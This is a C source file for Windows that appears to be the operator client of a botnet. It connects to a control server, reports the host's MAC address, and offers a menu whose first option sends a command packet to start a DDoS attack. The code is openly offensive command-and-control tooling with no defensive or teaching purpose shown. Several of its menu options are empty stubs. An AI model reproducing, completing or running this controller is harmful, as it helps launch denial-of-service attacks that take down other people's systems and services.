#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#include "conn.h"
#include "../process/system.h"
#include "../stdlib/packet.h"
#include "admin.h"

#include "../stdlib/packet_defs.h"

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096
#define CHECK_INTERVAL 10000

void is_connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
    char is_conn[2];

    do {
        printf("You are not connected to any server, are you connected? (Y/n): ");
        scanf("%1s", is_conn);

        if (strcmp(is_conn, "n") == 0 || strcmp(is_conn, "N") == 0) {
            exit(EXIT_SUCCESS);
        }

        if (connection(SERVER_ADDR, SERVER_PORT) != 0) {
            printf("Connection failed. Please try again or press 'n' to quit.\n");
        }
    } while(strcmp(is_conn, "n") != 0 && strcmp(is_conn, "N") != 0);
}

int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
    WSADATA wsaData;
    SOCKET sock;

    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int bytes_received;

    printf("\n\033[32mConnection...\033[0m\n");

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Error creating socket. Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Failed to connect -> server. Code %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    uint8_t mac[6];
    get_mac_address(mac);

    if (hello_packet(sock, mac) < 0) {
        printf("Failed to hello send packet\n");
    }

    printf("\033[32mConnect to server %s:%d success!\033[0m\n", SERVER_ADDR, SERVER_PORT);

    uint8_t action = input(sock);
    switch (action) {
        case 1:
            printf("Sending a packet at the beginning of a DDoS attack...\n");
            if (command_packet(sock, ADMIN_PACKET_CTYPE_COMMAND_DDOS, NULL) < 0) {
                printf("Failed to command ddos send packet\n");
            }
        case 2:
            break;
        case 3:
            break;
        case 4:
            break;
        case 5:
            break;
        default:
            break;
    }

    while (1) {
        bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            perror("Failed to get bytes data");
            closesocket(sock);
            break;
        }

        buffer[bytes_received] = '\0';
        printf("Server answer: %s\n", buffer);
    }

    closesocket(sock);
    WSACleanup();
    return 1;
}
